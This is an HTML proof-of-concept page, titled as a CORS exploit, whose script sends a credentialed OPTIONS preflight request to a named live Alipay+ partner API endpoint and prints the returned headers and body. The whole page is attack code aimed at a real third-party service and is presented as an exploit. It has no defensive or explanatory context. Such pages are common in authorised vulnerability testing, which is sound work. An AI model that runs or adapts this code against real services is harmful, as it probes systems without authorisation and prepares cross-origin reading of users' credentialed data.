<!DOCTYPE html>
<html>
  <head>
    <title>CORS PoC Exploit - OPTIONS Debug</title>
  </head>
  <body>
    <h1>Proof of Concept - CORS PoC Exploit (OPTIONS Debug)</h1>
    <button onclick="exploitOPTIONS()">Run Exploit (OPTIONS)</button>

    <pre id="output"></pre>

    <script>
      const target = "https://partner-api.alipayplus.com/api/aplus/applySupport.json";

      function exploitOPTIONS() {
        fetch(target, {
          method: "OPTIONS",
          credentials: "include",
          headers: {
            "Access-Control-Request-Method": "POST",
            "Access-Control-Request-Headers": "content-type,ctoken"
          }
        })
        .then(async response => {
          let headers = "";
          response.headers.forEach((v, k) => headers += k + ": " + v + "\n");
          const text = await response.text();

          document.getElementById("output").textContent =
            "=== OPTIONS Request ===\n" +
            "Status: " + response.status + "\n\n" +
            "Headers:\n" + headers + "\n" +
            "Body:\n" + (text || "[empty body]");
        })
        .catch(error => {
          document.getElementById("output").textContent =
            "OPTIONS Error: " + error;
        });
      }
    </script>
  </body>
</html>
